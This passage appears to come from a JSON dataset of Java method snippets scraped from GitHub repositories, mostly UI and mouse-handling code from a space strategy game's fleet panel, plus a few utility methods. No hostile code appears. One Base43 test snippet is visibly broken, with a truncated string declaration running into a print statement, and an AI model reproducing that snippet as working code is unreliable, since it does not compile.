drawShip(g, origFl, displayFl, showAdjust, 3, leftX, botY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 4, rightX, botY, shipW, shipH);\n                    break;\n                case 6:\n                default:\n                    drawShip(g, origFl, displayFl, showAdjust, 0, leftX+xAdj, topY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 1, rightX-xAdj, topY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 2, leftX+xAdj, midY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 3, rightX-xAdj, midY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 4, leftX+xAdj, botY, shipW, shipH);\n                    drawShip(g, origFl, displayFl, showAdjust, 5, rightX-xAdj, botY, shipW, shipH);\n                    break;\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56990, "method_name": "drawShip", "class_name": "FleetDetailPane", "params": ["Graphics2D", "ShipFleet", "ShipFleet", "boolean", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawShip(Graphics2D g, ShipFleet origFl, ShipFleet displayFl, boolean canAdjust, int i, int x0, int y0, int w, int h) {\n            int x = x0-w/2;\n            int y = y0-h/2;\n            g.setColor(fleetBackC);\n            Stroke prev = g.getStroke();\n            g.setStroke(stroke2);\n            g.drawRoundRect(x,y-s10,w,h+s20,s20,s20);\n            g.setStroke(prev);\n\n            ShipDesign d = origFl.visibleDesign(player().id,i);\n            Image img = d.image();\n            int imgW = img.getWidth(null);\n            int imgH = img.getHeight(null);\n            float scale = min((float)w/imgW, (float)h/imgH);\n\n            int w1 = (int)(scale*imgW);\n            int h1 = (int)(scale*imgH);\n\n            int x1 = x+((w-w1)/2);\n            int y1 = y+((h-h1)/2);\n            g.drawImage(img, x1, y1, x1+w1, y1+h1, 0, 0, imgW, imgH, parent);\n\n            // draw ship name\n            this.scaledFont(g, d.name(), w-s5, 18, 14);\n            //g.setFont(narrowFont(18));\n            int sw = g.getFontMetrics().stringWidth(d.name());\n            int x2 = x+((w-sw)/2);\n            g.setColor(SystemPanel.grayText);\n            g.drawString(d.name(), x2, y+s5);\n\n            int y3 = y+h+s7;\n\n            Color c0 = shipBox[i] == hoverBox ? SystemPanel.yellowText : SystemPanel.grayText;\n            Color c1;\n\n            int a[] = new int[3];\n            int b[] = new int[3];\n\n            // draw adjustment arrows\n            if (canAdjust) {\n                g.setColor(buttonBackC);\n                g.fillRoundRect(x, y3-s15, w, s18, s20, s20);\n                g.setColor(c0);\n                b[0]=y3-s6;  b[1]=y3-s12; b[2]=y3;\n                // draw min box\n                c1 = hoverBox2 == minBox[i] ? SystemPanel.yellowText : SystemPanel.grayText;\n                g.setColor(c1);\n                a[0]=x+s5; a[1]=x+s15; a[2]=x+s15;\n                minBox[i].addPoint(a[0], b[0]);\n                minBox[i].addPoint(a[1], b[1]);\n                minBox[i].addPoint(a[2], b[2]);\n                g.fill(minBox[i]); g.fillRect(a[0], b[1], s2, b[2]-b[1]);\n                // draw left box\n                c1 = hoverBox2 == downBox[i] ? SystemPanel.yellowText : SystemPanel.grayText;\n                g.setColor(c1);\n                a[0]=x+s17; a[1]=x+s27; a[2]=x+s27;\n                downBox[i].addPoint(a[0], b[0]);\n                downBox[i].addPoint(a[1], b[1]);\n                downBox[i].addPoint(a[2], b[2]);\n                g.fill(downBox[i]);\n                // draw max box\n                c1 = hoverBox2 == maxBox[i] ? SystemPanel.yellowText : SystemPanel.grayText;\n                g.setColor(c1);\n                a[0]=x+w-s5; a[1]=x+w-s15; a[2]=x+w-s15;\n                maxBox[i].addPoint(a[0], b[0]);\n                maxBox[i].addPoint(a[1], b[1]);\n                maxBox[i].addPoint(a[2], b[2]);\n                g.fill(maxBox[i]); g.fillRect(a[0]-s2, b[1], s2, b[2]-b[1]);\n                // draw up box\n                c1 = hoverBox2 == upBox[i] ? SystemPanel.yellowText : SystemPanel.grayText;\n                g.setColor(c1);\n                a[0]=x+w-s17; a[1]=x+w-s27; a[2]=x+w-s27;\n                upBox[i].addPoint(a[0], b[0]);\n                upBox[i].addPoint(a[1], b[1]);\n                upBox[i].addPoint(a[2], b[2]);\n                g.fill(upBox[i]);\n            }\n\n            // draw ship count\n            g.setColor(c0);\n            // format ship count\n            int count2 = origFl.num(d.id());\n            int count1 = canAdjust ? displayFl.num(d.id()) : count2;\n            String s = count1 == count2 ? str(count1) : text(\"MAIN_FLEET_SHIP_COUNT\", count1,count2);\n            this.scaledFont(g, s, w-s60, 18, 12);\n            int sw3 = g.getFontMetrics().stringWidth(s);\n            int x3 = x+((w-sw3)/2);\n            g.drawString(s, x3, y3);\n\n            // if hovering, draw highlight frame\n            if (hoverBox == shipBox[i]) {\n                prev = g.getStroke();\n                g.setStroke(stroke1);\n                g.setColor(SystemPanel.yellowText);\n                g.drawRoundRect(x,y-s10,w,h+s20,s20,s20);\n                g.setStroke(prev);\n            }\n            shipBox[i].setBounds(x,y-s10,w,h+s20);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56991, "method_name": "mouseWheelMoved", "class_name": "FleetDetailPane", "params": ["MouseWheelEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseWheelMoved(MouseWheelEvent e) {\n            int count = e.getUnitsToScroll();\n            if (count == 0)\n                return;\n            if (hoverStackNum < 0)\n                return;\n\n            ShipFleet fl = selectedFleet();\n            if (fl == null)\n                return;\n\n            ShipDesign d = fl.visibleDesign(player().id, hoverStackNum);\n            int index = d.id();\n            int stackNum = fl.num(index);\n            int currAdj = stackAdjustment[index];\n            int n = stackNum+currAdj;\n            int delta = n>30000 ? 10000 : (n>3000 ? 1000 : (n>300 ? 100 : (n>30 ? 10:1)));\n            if (count > 0)\n                stackAdjustment[index] = max(0-stackNum, currAdj-delta);\n            else if (count < 0)\n                stackAdjustment[index] = min(0, currAdj+delta);\n\n            adjustedFleet(newAdjustedFleet());\n            if (((stackNum + currAdj) == 0)\n            || (stackNum + stackAdjustment[index]) == 0)\n                repaint();\n            else if (currAdj != stackAdjustment[index])\n                repaint();\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56992, "method_name": "mouseDragged", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseDragged(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56993, "method_name": "mouseMoved", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseMoved(MouseEvent e) {\n            int x = e.getX();\n            int y = e.getY();\n            Shape prevHover = hoverBox;\n            Shape prevHover2 = hoverBox2;\n            hoverBox = null;\n            hoverBox2 = null;\n            hoverStackNum = -1;\n            for (int i=0;i<shipBox.length;i++) {\n                if (shipBox[i].contains(x,y)) {\n                    hoverBox = shipBox[i];\n                    hoverStackNum = i;\n                }\n                if (minBox[i].contains(x,y))\n                    hoverBox2 = minBox[i];\n                if (downBox[i].contains(x,y))\n                    hoverBox2 = downBox[i];\n                if (upBox[i].contains(x,y))\n                    hoverBox2 = upBox[i];\n                if (maxBox[i].contains(x,y))\n                    hoverBox2 = maxBox[i];\n            }\n            if ((hoverBox != prevHover)\n            || (hoverBox2 != prevHover2))\n                repaint();\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56994, "method_name": "mouseClicked", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseClicked(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56995, "method_name": "mouseEntered", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseEntered(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56996, "method_name": "mouseExited", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseExited(MouseEvent e) {\n            if ((hoverBox != null) || (hoverBox2 != null)){\n                hoverBox = null;\n                hoverBox2 = null;\n                repaint();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56997, "method_name": "mousePressed", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mousePressed(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56998, "method_name": "mouseReleased", "class_name": "FleetDetailPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseReleased(MouseEvent e) {\n            if (e.getButton() > 3)\n                return;\n            int x = e.getX();\n            int y = e.getY();\n            ShipFleet fl = selectedFleet();\n            // selectedFleet can be null if hovering with mouse\n            if ((fl == null) || (hoverStackNum < 0) )\n                return;\n            ShipDesign d = fl.visibleDesign(player().id, hoverStackNum);\n            int index = d.id();\n            int stackNum = fl.num(index);\n            int currAdj = stackAdjustment[index];\n            int newAdj = 1;\n            for (int i=0;i<shipBox.length;i++) {\n                if (minBox[i].contains(x,y))\n                    newAdj = 0-stackNum;\n                else if (downBox[i].contains(x,y))\n                    newAdj = max(currAdj-1, 0-stackNum);\n                else if (upBox[i].contains(x,y))\n                    newAdj = min(currAdj+1, 0);\n                else if (maxBox[i].contains(x,y))\n                            newAdj = 0;\n            }\n\n            // nothing in click range\n            if (newAdj > 0)\n                return;\n\n            if (newAdj == stackAdjustment[index])\n                misClick();\n            else {\n                stackAdjustment[index] = newAdj;\n                adjustedFleet(newAdjustedFleet());\n                softClick();\n                repaint();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener", "MouseWheelListener"], "modifiers": ["public"]}}, {"id": 56999, "method_name": "textureName", "class_name": "FleetButtonPane", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String textureName()            { return TEXTURE_GRAY; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57000, "method_name": "init", "class_name": "FleetButtonPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void init() {\n            addMouseListener(this);\n            addMouseMotionListener(this);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57001, "method_name": "initGradients", "class_name": "FleetButtonPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void initGradients() {\n            initted = true;\n            int w = getWidth();\n            leftM = s2;\n            midM1 = (w*3/5)-s2;\n            midM2 = midM1+s4;\n            rightM = w-s2;\n            Point2D start = new Point2D.Float(leftM, 0);\n            Point2D mid1 = new Point2D.Float(midM1, 0);\n            Point2D mid2 = new Point2D.Float(midM2, 0);\n            Point2D end = new Point2D.Float(rightM, 0);\n            float[] dist = {0.0f, 0.5f, 1.0f};\n\n            Color grayEdgeC = new Color(59,59,59);\n            Color grayMidC = new Color(92,92,92);\n            Color[] grayColors = {grayEdgeC, grayMidC, grayEdgeC };\n\n            Color greenEdgeC = new Color(44,59,30);\n            Color greenMidC = new Color(71,93,48);\n            Color[] greenColors = {greenEdgeC, greenMidC, greenEdgeC };\n\n            Color redEdgeC = new Color(92,20,20);\n            Color redMidC = new Color(117,42,42);\n            Color[] redColors = {redEdgeC, redMidC, redEdgeC };\n\n            fullGrayBackC = new LinearGradientPaint(start, end, dist, grayColors);\n            smallGrayBackC = new LinearGradientPaint(mid2, end, dist, grayColors);\n            largeGreenBackC = new LinearGradientPaint(start, mid1, dist, greenColors);\n            largeRedBackC = new LinearGradientPaint(start, mid1, dist, redColors);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57002, "method_name": "paintComponent", "class_name": "FleetButtonPane", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void paintComponent(Graphics g0) {\n            Graphics2D g = (Graphics2D) g0;\n            super.paintComponent(g);\n\n            if (!initted)\n                initGradients();\n\n            ShipFleet fleet = parent.adjustedFleet();\n            if (fleet == null)\n                return;\n\n            clearButtons();\n            if (!fleet.empire().isPlayer()) {\n                drawFullCancelButton(g);\n                return;\n            }\n\n            StarSystem dest = parent.displayedDestination();\n            if (dest != null) {\n                if (!fleet.canReach(dest))  {\n                    drawFullOutOfRangeButton(g);\n                    return;\n                }\n                else if (!fleet.canSendTo(id(dest))) {\n                    if (fleet.retreating()) \n                        drawFullInvalidRetreatButton(g);\n                    else\n                        drawFullCancelButton(g);\n                    return;\n                }\n                else {\n                    drawLargeDeployButton(g);\n                    drawSmallCancelButton(g);\n                    return;\n                }\n            }\n            if (fleet.canUndeploy()) {\n                drawLargeUndeployButton(g);\n                drawSmallCancelButton(g);\n                return;\n            }\n            drawFullCancelButton(g);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57003, "method_name": "clearButtons", "class_name": "FleetButtonPane", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void clearButtons() {\n            cancelBox.setBounds(0,0,0,0);\n            deployBox.setBounds(0,0,0,0);\n            undeployBox.setBounds(0,0,0,0);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57004, "method_name": "drawFullOutOfRangeButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawFullOutOfRangeButton(Graphics2D g) {\n            drawButton(g,fullGrayBackC,text(\"MAIN_FLEET_OUT_OF_RANGE\"), cancelBox, leftM, rightM);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57005, "method_name": "drawFullInvalidRetreatButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawFullInvalidRetreatButton(Graphics2D g) {\n            drawButton(g,fullGrayBackC,text(\"MAIN_FLEET_INVALID_RETREAT\"), cancelBox, leftM, rightM);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57006, "method_name": "drawFullCancelButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawFullCancelButton(Graphics2D g) {\n            drawButton(g,fullGrayBackC,text(\"MAIN_FLEET_CANCEL\"), cancelBox, leftM, rightM);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57007, "method_name": "drawLargeUndeployButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawLargeUndeployButton(Graphics2D g) {\n            drawButton(g,largeRedBackC,text(\"MAIN_FLEET_UNDEPLOY_FLEET\"), undeployBox, leftM, midM1);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57008, "method_name": "drawLargeDeployButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawLargeDeployButton(Graphics2D g) {\n            drawButton(g,largeGreenBackC,text(\"MAIN_FLEET_DEPLOY_FLEET\"), deployBox, leftM, midM1);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57009, "method_name": "drawSmallCancelButton", "class_name": "FleetButtonPane", "params": ["Graphics2D"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawSmallCancelButton(Graphics2D g) {\n            drawButton(g,smallGrayBackC,text(\"MAIN_FLEET_CANCEL\"), cancelBox, midM2, rightM);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57010, "method_name": "drawButton", "class_name": "FleetButtonPane", "params": ["Graphics2D", "LinearGradientPaint", "String", "Rectangle", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawButton(Graphics2D g, LinearGradientPaint gradient, String label, Rectangle actionBox, int x1, int x2) {\n            int y = s4;\n            int h = getHeight()-s7;\n            int w = x2 - x1;\n            if (actionBox != null)\n                actionBox.setBounds(x1,y,w,h);\n            g.setColor(buttonShadowC);\n            Stroke prev = g.getStroke();\n            g.setStroke(stroke2);\n            g.drawRoundRect(x1+s3,y+s2,w-s2,h,s10,s10);\n            g.setStroke(prev);\n\n            g.setPaint(gradient);\n            g.fillRoundRect(x1,y,w,h,s10,s10);\n\n            boolean hovering = (actionBox != null) && (actionBox == hoverBox);\n            Color c0 = hovering ? SystemPanel.yellowText : SystemPanel.whiteText;\n\n            g.setFont(narrowFont(22));\n            int sw = g.getFontMetrics().stringWidth(label);\n            int x0 = x1+((w-sw)/2);\n            drawShadowedString(g, label, 3, x0, y+h-s11, SystemPanel.textShadowC, c0);\n\n            g.setColor(c0);\n            Stroke prev2 = g.getStroke();\n            g.setStroke(stroke2);\n            g.drawRoundRect(x1+s1,y,w-s2,h,s10,s10);\n            g.setStroke(prev2);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57011, "method_name": "mouseDragged", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseDragged(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57012, "method_name": "mouseMoved", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseMoved(MouseEvent e) {\n            int x = e.getX();\n            int y = e.getY();\n\n            Shape prevHover = hoverBox;\n            hoverBox = null;\n            if (cancelBox.contains(x,y))\n                hoverBox = cancelBox;\n            else if (deployBox.contains(x,y))\n                hoverBox = deployBox;\n            else if (undeployBox.contains(x,y))\n                hoverBox = undeployBox;\n\n            if (hoverBox != prevHover)\n                repaint();\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57013, "method_name": "mouseClicked", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseClicked(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57014, "method_name": "mouseEntered", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseEntered(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57015, "method_name": "mouseExited", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseExited(MouseEvent e) {\n            if (hoverBox != null) {\n                hoverBox = null;\n                repaint();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57016, "method_name": "mousePressed", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mousePressed(MouseEvent e) { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57017, "method_name": "mouseReleased", "class_name": "FleetButtonPane", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseReleased(MouseEvent e) {\n            if (e.getButton() > 3)\n                return;\n            int x = e.getX();\n            int y = e.getY();\n\n            if (cancelBox.contains(x,y)) {\n                softClick();\n                parent.cancelFleet();\n            }\n            else if (deployBox.contains(x,y)) {\n                softClick();\n                parent.sendFleet();\n            }\n            else if (undeployBox.contains(x,y)) {\n                softClick();\n                parent.undeployFleet();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/main/FleetPanel.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseListener", "MouseMotionListener"], "modifiers": ["public"]}}, {"id": 57018, "method_name": "test", "class_name": "Base43Test", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test() {\n        assertEquals(Hex.toHexString(Base43.decode(electrum43TransactionString)), hexTransactionString);\n        assertEquals(Base43.encode(Hex.decode(hexTransactionString)), electrum43TransactionString);\n\n        String sn        System.out.println(Hex.toHexString(Base43.decode(s)));\n\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/test/java/com/cobo/coinlib/Base43Test.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57019, "method_name": "mapThrowable", "class_name": "ExceptionToResourceMapping", "params": ["Throwable"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer mapThrowable(final Throwable throwable) {\n        Throwable throwableToCheck = throwable;\n        int depthToGo = 20;\n\n        while (true) {\n            Integer resId = mapThrowableFlat(throwableToCheck);\n            if (resId != null) {\n                return resId;\n            } else {\n                throwableToCheck = throwableToCheck.getCause();\n                depthToGo--;\n                if (depthToGo <= 0 || throwableToCheck == throwable || throwableToCheck == null) {\n                    Log.d(\"KeventBus\", \"No specific message resource ID found for \" + throwable);\n                    // return config.defaultErrorMsgId;\n                    return null;\n                }\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57020, "method_name": "mapThrowableFlat", "class_name": "ExceptionToResourceMapping", "params": ["Throwable"], "throws": null, "modifiers": ["protected"], "return_type": "Integer", "snippet": "    protected Integer mapThrowableFlat(Throwable throwable) {\n        Class<? extends Throwable> throwableClass = throwable.getClass();\n        Integer resId = throwableToMsgIdMap.get(throwableClass);\n        if (resId == null) {\n            Class<? extends Throwable> closestClass = null;\n            Set<Entry<Class<? extends Throwable>, Integer>> mappings = throwableToMsgIdMap.entrySet();\n            for (Entry<Class<? extends Throwable>, Integer> mapping : mappings) {\n                Class<? extends Throwable> candidate = mapping.getKey();\n                if (candidate.isAssignableFrom(throwableClass)) {\n                    if (closestClass == null || closestClass.isAssignableFrom(candidate)) {\n                        closestClass = candidate;\n                        resId = mapping.getValue();\n                    }\n                }\n            }\n\n        }\n        return resId;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57021, "method_name": "addMapping", "class_name": "ExceptionToResourceMapping", "params": ["Class<Throwable>", "int"], "throws": null, "modifiers": ["public"], "return_type": "ExceptionToResourceMapping", "snippet": "    public ExceptionToResourceMapping addMapping(Class<? extends Throwable> clazz, int msgId) {\n        throwableToMsgIdMap.put(clazz, msgId);\n        return this;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ExceptionToResourceMapping.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57022, "method_name": "main", "class_name": "ZuulApp", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args)  {\n        SpringApplication.run(ZuulApp.class);\n    }", "url": "https://raw.githubusercontent.com/zhuchangwu/lawyer-lover-cloud-backend/master/lawyer-lover-zuul/src/main/java/com/changwu/ZuulApp.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57023, "method_name": "getFilesize", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFilesize() {\n        return filesize;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57024, "method_name": "setFilesize", "class_name": "Quality", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFilesize(String filesize) {\n        this.filesize = filesize;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57025, "method_name": "getSize", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getSize() {\n        return size;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57026, "method_name": "setSize", "class_name": "Quality", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSize(long size) {\n        this.size = size;\n    }", "url": 